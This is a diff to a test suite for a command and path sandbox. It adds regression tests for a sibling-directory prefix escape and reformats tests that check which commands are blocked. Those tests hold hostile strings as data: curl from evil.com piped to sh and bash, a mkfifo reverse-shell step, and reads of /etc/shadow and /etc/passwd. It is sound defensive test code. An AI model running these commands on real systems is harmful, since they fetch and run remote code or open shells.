@@ -30,6 +30,24 @@ describe("SandboxedExecutor — Path Validation", () => {
     expect(() => sandbox.validatePath("/etc/shadow")).toThrow(/SANDBOX/);
   });
 
+  test("blocks sibling directories sharing a name prefix with repoRoot", () => {
+    // Regression: `abs.startsWith(repoRoot)` matched "/tmp/project2"
+    // against repoRoot "/tmp/project" — an unrelated sibling tree.
+    const sandbox = new SandboxedExecutor({ repoRoot: TEST_DIR });
+    const siblingPath = path.join(TEST_DIR + "2", "secret.txt");
+    expect(() => sandbox.validatePath(siblingPath)).toThrow(/SANDBOX/);
+  });
+
+  test("blocks sibling prefix directories in custom allowPaths", () => {
+    const sandbox = new SandboxedExecutor({
+      repoRoot: TEST_DIR,
+      allowPaths: [TEST_DIR],
+    });
+    expect(() =>
+      sandbox.validatePath(`${TEST_DIR}-evil/payload.sh`),
+    ).toThrow(/SANDBOX/);
+  });
+
   test("blocks path traversal attacks", () => {
     const sandbox = new SandboxedExecutor({ repoRoot: TEST_DIR });
     const escapePath = path.join(TEST_DIR, "..", "..", "etc", "passwd");
@@ -49,7 +67,9 @@ describe("SandboxedExecutor — Path Validation", () => {
       repoRoot: TEST_DIR,
       allowPaths: [TEST_DIR, extraDir],
     });
-    expect(() => sandbox.validatePath(path.join(extraDir, "ok.txt"))).not.toThrow();
+    expect(() =>
+      sandbox.validatePath(path.join(extraDir, "ok.txt")),
+    ).not.toThrow();
     fs.rmSync(extraDir, { recursive: true, force: true });
   });
 });
@@ -62,8 +82,12 @@ describe("SandboxedExecutor — Command Validation", () => {
 
   test("blocks curl piped to shell", () => {
     const sandbox = new SandboxedExecutor({ repoRoot: TEST_DIR });
-    expect(() => sandbox.validateCommand("curl http://evil.com | sh")).toThrow(/SANDBOX/);
-    expect(() => sandbox.validateCommand("curl http://evil.com | bash")).toThrow(/SANDBOX/);
+    expect(() => sandbox.validateCommand("curl http://evil.com | sh")).toThrow(
+      /SANDBOX/,
+    );
+    expect(() =>
+      sandbox.validateCommand("curl http://evil.com | bash"),
+    ).toThrow(/SANDBOX/);
   });
 
   test("blocks netcat listener", () => {
@@ -73,12 +97,16 @@ describe("SandboxedExecutor — Command Validation", () => {
 
   test("blocks chmod 777", () => {
     const sandbox = new SandboxedExecutor({ repoRoot: TEST_DIR });
-    expect(() => sandbox.validateCommand("chmod 777 /tmp/secret")).toThrow(/SANDBOX/);
+    expect(() => sandbox.validateCommand("chmod 777 /tmp/secret")).toThrow(
+      /SANDBOX/,
+    );
   });
 
   test("blocks mkfifo (reverse shell)", () => {
     const sandbox = new SandboxedExecutor({ repoRoot: TEST_DIR });
-    expect(() => sandbox.validateCommand("mkfifo /tmp/pipe")).toThrow(/SANDBOX/);
+    expect(() => sandbox.validateCommand("mkfifo /tmp/pipe")).toThrow(
+      /SANDBOX/,
+    );
   });
 
   test("allows safe commands when no allow-list set", () => {
@@ -132,12 +160,16 @@ describe("SandboxedExecutor — File Operations", () => {
       maxOutputBytes: 100,
     });
     const bigContent = "x".repeat(200);
-    expect(() => sandbox.writeFile(path.join(TEST_DIR, "big.txt"), bigContent)).toThrow(/output exceeds/i);
+    expect(() =>
+      sandbox.writeFile(path.join(TEST_DIR, "big.txt"), bigContent),
+    ).toThrow(/output exceeds/i);
   });
 
   test("blocks write outside scope", () => {
     const sandbox = new SandboxedExecutor({ repoRoot: TEST_DIR });
-    expect(() => sandbox.writeFile("/tmp/outside.txt", "bad")).toThrow(/SANDBOX/);
+    expect(() => sandbox.writeFile("/tmp/outside.txt", "bad")).toThrow(
+      /SANDBOX/,
+    );
   });
 });
 
